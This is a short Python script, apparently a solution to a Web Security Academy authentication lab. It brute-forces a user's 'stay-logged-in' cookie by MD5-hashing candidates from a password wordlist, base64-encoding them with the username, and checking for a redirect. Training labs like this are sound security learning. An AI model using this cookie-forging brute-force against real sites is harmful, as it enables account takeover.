import requests
import hashlib
import base64

url = """https://0a52009b040b875680099e33006b00d8.web-security-academy.net/my-account?id=carlos"""

with open("authentication_lab_passwords.txt") as f:
    for line in f:
        encoded_line = line.strip().encode(encoding="utf-8")
        md5=hashlib.md5(encoded_line)
        full_string = "carlos:"+md5.hexdigest()
   
        b64_string = base64.b64encode(full_string.encode())           # hexdigest has the right format - the same, that the website also uses
        final_string=b64_string.decode()
        cookie = {"stay-logged-in":final_string}

        r= requests.get(url, cookies=cookie)                         
        if r.url == url:                                             # if the password is wrong it will go back to https://0a52009b040b875680099e33006b00d8.web-security-academy.net/login
            print(line)
            break

       